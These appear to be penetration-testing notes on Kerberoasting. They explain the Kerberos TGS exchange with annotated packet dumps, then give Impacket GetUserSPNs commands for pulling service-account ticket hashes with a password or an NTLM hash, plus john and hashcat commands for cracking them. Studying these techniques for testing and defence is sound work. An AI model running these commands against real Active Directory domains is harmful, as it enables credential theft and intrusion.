
# Kerberoasting
Kerberoasting is an attack that targets the Kerberos authentication protocol to extract service account credentials. 

- The attack exploits the way Kerberos handles service tickets (TGS-REP). 
- Service Tickets are encrypted with service account's NTLM hash.
- So, By requesting service tickets for all SPNs (Service Principal Names), an attacker can perform offline brute-force attack to obtain plaintext passwords.

Here's how it works:

- **TGT-REQ:** Client send its TGT + authenticator (encrypted with session key) and the service name to the Ticket Granting Server.

- **TGS-REP:** Ticket Granting server verifies the TGT and responds with the Service Ticket Encrypted with the Service account password hash + a new session key encrypted with old session key.

### TGS REQ

```
Kerberos TGS-REQ
	pvno: 5
	msg-type: krb-tgs-req (12)
	padata: 1 item
	    PA-DATA
            padata-type: pA-TGS-REQ (1)
            padata-value: 6e82953d308290539a003920105
	req-body
	    Padding: 0
	    kdc-options: 40810010 (hex)
	    realm: DOMAIN.COM
	    sname:
            name-type: kRB5-NT-MS-PRINCIPAL (-128)
            sname-string:
               SNameString: DOMAIN.COM\web_srv
	    till: Jul 8, 2025 03:54:18.000000000 IST
	    nonce: 665478473
	    etype:
	        eTYPE-ARCFOUR-HMAC-MD5 (23) [RC4]
	        eTYPE-DES3-CBC-SHA1 (16)
	        eTYPE-DES-CBC-MD5 (3)
	        eTYPE-ARCFOUR-HMAC-MD5 (23) [RC4 - repeated]
	    
```

- padata: TGT (encrypted with KDC secret key) + timestamp (encrypted with session key)
- sname: service name
### TGS REP

```
Kerberos TGS-REP
	pvno: 5
	msg-type: krb_tgs_rep 13
    crealm: DOMAIN.COM
	cname:
	    nametype: 1 (kRB5-NT-PRINCIPAL)
	    name: bob
	ticket
	    tkt-vno: 5
	    realm: DOMAIN.COM
	    sname:
	        nametype: -128 (kRB5-NT-MS-PRINCIPAL)
	        snamesting: DOMAIN.COM\web_svc
	    enc-part
	        etype: 23 (RC4 - ARCFOUR-HMAC-MD5)
	        kvno: 2
	        cipher: d5a12d0d96c40db1e1c923ac35a8bbb965ef275a8899a48fede4
	enc-type:
	    enctype: 23 (RC4 - ARCFOUR-HMAC-MD5)
	    cipher: a7e146fddf968e4b838ccae2687944c04fa3519d2fea8aeddff42

```

- cname: Client requesting the ticket.
- ticket: Service ticket for web_svc.
- ticket.enc-part: The ticket encrypted with the service's key (web_svc's password hash only the service and KDC know this key).
- enc-type: here again session key, encrypted with the session key from TGT.

```
$krb5tgs$23$*web_svc$DOMAIN.COM$domain.com/web_svc*d5a12d0d96c40db1e1c923ac35a8bbb965ef275a8899a48fede4...
```

## Performing Kerberoasting with Impacket

**With a password**
```
impacket-GetUserSPNs <domain>/username:password -outputfile hashes.txt -request -dc-ip <domain_controller_ip>
```

```
GetUserSPNs.py <domain>/<username>:<password> -dc-ip <domain_controller_ip> -request
```

**With a hash**
```
impacket-GetUserSPNs -hashes <lmhash>:<nthash> <domain>/username -outputfile hashes.txt -request -dc-ip <domain_controller_ip>
```

```
GetUserSPNs.py -request -hashes LMHASH:NTHASH <domain>/<username>:<ntlm_hash> -dc-ip <domain_controller_ip>
```

![image info](../assets/Pasted%20image%2020250721115853.png)

## Crack Kerberose Hash

```
john --format=krb5tgs --wordlist=/usr/share/wordlist/rockyou.txt hash.txt
```

```
hashcat -m 13100 -a 0 hash.txt /usr/share/wordlist/rockyou.txt
```

![image info](../assets/Pasted%20image%2020250721122054.png)